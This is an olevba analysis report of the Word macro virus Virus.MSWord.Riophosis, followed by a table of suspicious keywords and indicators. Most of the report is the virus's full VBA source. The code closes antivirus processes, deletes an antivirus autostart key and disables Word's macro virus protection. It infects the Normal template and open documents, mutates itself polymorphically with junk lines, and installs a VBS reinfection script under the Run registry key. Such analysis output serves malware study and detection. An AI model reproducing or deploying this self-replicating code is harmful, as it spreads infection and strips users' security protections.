olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Riophosis
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Riophosis - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Riophosis - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub dOCUmENt_CLoSE()
For Each PRog In Tasks
If InStr(1, UCase(PRog.Name), Chr(78) & Chr(65) & Chr(86)) Then PRog.Close
If InStr(1, UCase(PRog.Name), Chr(65) & Chr(78) & Chr(84) & Chr(73) & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83)) Then PRog.Close
Next
System.PrivateProfileString("", "Hkey_LoCAL_MACHInE\SoFTwAre\MICROSOfT\windowS\currENtVerSiOn\rUN\", "nAv Agent") = ""
BThHTrRGcfG = 122174.617662907 Or 684237.451576531  '
With Application
Nohkjo = 712368.431593716 And 76435.6087220907  '
.DisplayAlerts = wdAlertsNone
onnchbl = 586217.413240314 + 739983.593530834  '
.EnableCancelKey = wdCancelDisabled
With .Options
prdcfhont = naqrpbedd Eqv jhhtejqrf '
.VirusProtection = 0
qkqjc = qnkkj Xor mhajq '
.ConfirmConversions = 0
bfmhcipmiho = ifgbkceksca And isdarfbtkii '
jebnnsl = soiphpj Eqv rrqfhdr '
.SaveNormalPrompt = 0
End With
jooibrjff = 834244.311075747 Eqv 531363.790344357  '
End With
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate
jidbj = 894053.339973629 Xor 563240.203284502  '
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument
SouRCefile = Environ$("wInDIR") & "\RioPhoSIS.sYS"
hhisihddrsoqqa = jqalsipposdlqc + teftpdoekdsgdq '
VBSBackup = Environ$("wINdIR") & "\RiOpHoSiS.vBs"
cjcflschfea = 573881.886711717 Or 305555.097677171  '
With ThisDocument.VBProject.VbCOmPOnEnTs(1).coDEmodULE
vCOde = UCase(.lines(1, .cOUNTOfLinES))
ofsijmkcfr = simapslfmh Or seploqjnho '
poLy
jerqtcpd = egakqgod + lgapdshn '
btgfbdkkthlas = 7975.92796003819 Or 452493.274713457  '
For couNter = 1 To Len(vCOde)
tbhrrihnjrkfgm = 164667.97812742 And 738947.1293993  '
aieokojmqqks = 990259.014737248 Xor 200465.538307607  '
T = Mid(vCOde, couNter, 1)
cngifhsttntm = 226566.505363047 Or 326078.92330277  '
onlkkhtsni = 238983.749777913 Or 116403.046076238  '
If Asc(T) < 90 And Asc(T) > 65 Then T = Chr(Asc(T) + Int(Rnd * 2) * 32)
nndemtmnfai = ogpjoiggmph Eqv spedatqflge '
NewVCoDe = NewVCoDe & T
Next
lnttribtdcte = 104719.176477313 And 754792.233507335  '
fegdn = gfrod + fsgkl '
Open SouRCefile For Output As #1
Print #1, NewVCoDe
paqmpgjblfqbs = 729437.277439892 And 284994.436417937  '
Close #1
otjqmctjf = gmsnkcttf And pnrkedfsl '
Open VBSBackup For Output As #1
Print #1, "on erROr resuME neXt"
llhfcm = dmgedh Or qkomje '
Print #1, "sEt fsO = creATEoBJeCt(""word.AppLiCATION"")"
Print #1, "WitH fSO.OPtIoNS"
eogcqpetsao = 256962.400012136 + 285123.122717321  '
Print #1, ".VIRUsProteCtiON = 0"
Print #1, ".confIRmcoNveRsIons = 0"
ckhcokla = 889230.673382878 + 800425.265495718  '
Print #1, ".SAVENoRmALPRompt = 0"
Print #1, ".APPLicATion.DiSPlAYAlertS = WdALERtSnonE"
nqooalblt = 672370.715110302 And 794389.585992157  '
Print #1, "EnD WIth"
irjnheodbcis = jpjrbhamcaqd Xor itsbpdoltaql '
Print #1, "wITh FSO.NormAltempLATE.VbPrOJECT.vBcOMPOnenTs(1)"
Print #1, ".CODEMOdulE.delETElINes 1, .cODEMOdULE.CoUntOflinES"
brpteakmgssshh = fqeedohtpfrcjg Xor ffheojcopggqpo '
Print #1, ".cOdemODULe.ADDFRomfILe """ & SouRCefile & """"
leihlkbhgs = pdffctlges Eqv enkdpqdiab '
Print #1, "eND wiTh"
nhpbilpaie = 519876.43706274 And 253826.543181717  '
Print #1, "FsO.nORMAlTeMPlATE.sAve"
eentipgcmd = pasjcrbfjc - bekjroicqk '
Print #1, "fsO.QUit"
qjamoh = relefg - hltthm '
Close #1
geqpeisebabt = 194717.331718326 - 799250.578331172  '
patblqtr = jtjkmqat + cioknceo '
cgeng = lepio Or orerm '
sjniidnddmp = segahmijlqj Xor nerkjhqjsbi '
System.PrivateProfileString("", "hkey_lOcAL_MAcHinE\SOFtWARE\micRosofT\WInDoWs\currENTVErsiON\ruN\", "rIophoSis") = VBSBackup
ipqmemccjeae = 63980.6942093968 Or 220331.09089458  '
hsodf = 529367.692391574 - 390696.850132227  '
End With
amcdrj = 793275.516690731 - 269565.968360245  '
With Target.VBProject.VbCOmPOnEnTs(1).coDEmodULE
bmksngmclpsfj = otjirahaaokpe Xor fenhrmehnsima '
pnegndeptnhes = 370822.118439138 - 261597.848600864  '
.DEleTELiNeS 1, .cOUNTOfLinES
rfrpbflmngnfaj = jnomtjlnmmgebr Xor fbogoscrmgjlse '
.AddFromFile SouRCefile
cbakepfkgnmde = 518258.053366184 Or 273330.117122948  '
End With
qpaaidojbc = drhnapkhml - qeoftfabeg '
holpeijjg = 575600.40611136 + 341415.123462617  '
End Sub
Private Sub poLy()
With ThisDocument.VBProject.VbCOmPOnEnTs(1).coDEmodULE
IRLnT = bSPjG - LgPlr '
For i = 1 To .cOUNTOfLinES
nJrJtCRLsk = 518319.922925591 Xor 186108.462668359  '
a = Int(Rnd * 6) + 1
If a = 1 Then oPER = Space(1) & "xOR" & Space(1)
ABtMA = sSIPA Eqv SiMEp '
If a = 2 Then oPER = Space(1) & "AND" & Space(1)
ThjQBerkiCs = LeIrjorCpLh Or PARqEGFdbtJ '
If a = 3 Then oPER = Space(1) & "Or" & Space(1)
cSJSPgPb = bksmhkLd + AQnftrdj '
If a = 4 Then oPER = Space(1) & "+" & Space(1)
pnnShNmK = SgNSOPsj Xor hORPIAjN '
If a = 5 Then oPER = Space(1) & "-" & Space(1)
If a = 6 Then oPER = Space(1) & "EQv" & Space(1)
LOocAtGoLn = 218693.812544525 - 137661.08098197  '
a = Int(Rnd * 2) + 1
For II = 1 To 5 + Int(Rnd * 10)
NrLOnQsJElArd = 146328.89896667 And 160236.973265827  '
juNK1 = juNK1 & Chr(Int(Rnd * 20) + 97)
If a = 1 Then junk2 = junk2 & Chr(Int(Rnd * 20) + 97)
jLdHKEq = 172567.671823025 Or 88722.7959321141  '
If a = 2 Then junk2 = Space(1) & Rnd * 999999 & Space(1)
If a = 1 Then JuNK3 = JuNK3 & Chr(Int(Rnd * 20) + 97)
JqAlnpJiehk = LlGSBEBLNjq - IIOgJTOBQoK '
jJbcNqG = PdobtAh - pLNAhnR '
If a = 2 Then JuNK3 = Space(1) & Rnd * 999999 & Space(1)
Next
ijQrO = rrCEJ + tLLkA '
If Right(.lines(i, 1), Len(i) - 1) = "'" Then .rEPlAcElinE i, juNK1 & "=" & junk2 & oPER & JuNK3 & "'"
juNK1 = ""
BJiCQnthTNEfH = DFcfAkCgQQsfl - qFiImbTIAottS '
junk2 = ""
EpliLllHm = knROknGLc Xor noePGElTq '
JuNK3 = ""
THhlHl = IPmsGs - ElKfmT '
Next
cEefPGMjbAr = 464736.354530454 And 531917.576545179  '
End With
KmIlIeeHRjB = sEOTDeeBkPF + KJlNrmgkhsB '
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |dOCUmENt_CLoSE      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|rUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|creATEoBJeCt        |May create an OLE object                     |
|Suspicious|windowS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbCOmPOnEnTs        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|coDEmodULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RiOpHoSiS.vBs       |Executable file name                         |
|Hex String|A2@1                |41324031                                     |
|Hex String|Cpbt                |43706274                                     |
|Hex String|iB      9h          |6942093968                                   |
|Hex String|F&h5                |46266835                                     |
|Hex String|5E0E                |35453045                                     |
+----------+--------------------+---------------------------------------------+

